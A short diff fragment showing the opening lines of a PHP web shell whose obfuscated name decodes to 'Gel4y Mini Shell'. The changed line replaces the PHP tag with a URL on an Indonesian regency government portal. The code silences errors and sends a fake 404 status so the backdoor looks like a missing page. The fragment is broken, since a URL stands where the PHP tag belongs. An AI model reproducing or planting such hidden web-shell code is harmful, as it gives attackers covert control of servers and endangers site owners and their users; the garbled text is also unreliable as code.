@@ -1,4 +1,4 @@
-<?php
+<https://portal.deliserdangkab.go.id/menu/berita.php>
 error_reporting(0);
 http_response_code(404);
 define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
